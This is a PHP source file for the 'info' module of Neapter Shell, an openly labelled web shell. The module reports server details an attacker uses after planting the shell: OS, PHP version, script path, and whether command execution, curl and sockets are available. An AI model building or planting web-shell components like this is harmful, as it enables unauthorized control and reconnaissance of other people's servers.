<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Get usefull information about environment like username, hostname, php
 * version, url, curl etc.
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleInfo extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('info');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
info - Wyświetla informacje o systemie

    Użycie:
        info
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        return sprintf(
            "SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], " .
                "Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d]," .
                " SOCKET:[%d]",
            php_uname(),
            ($sIp = Request::getServer('REMOTE_ADDR')),
            @gethostbyaddr($sIp),
            PHP_VERSION,
            php_sapi_name(),
            ((PHP_SAPI === 'cli') ? 'CLI' : Request::getCurrentUrl()),
            ((PHP_SAPI === 'cli') ? Request::getServer('PWD') . '/' : '')
                . Request::getServer('SCRIPT_FILENAME'),
            $this->oUtils->isSafeMode(),
            $this->oUtils->isExecutable(),
            function_exists('curl_init'),
            function_exists('socket_create')
        );
    }
}
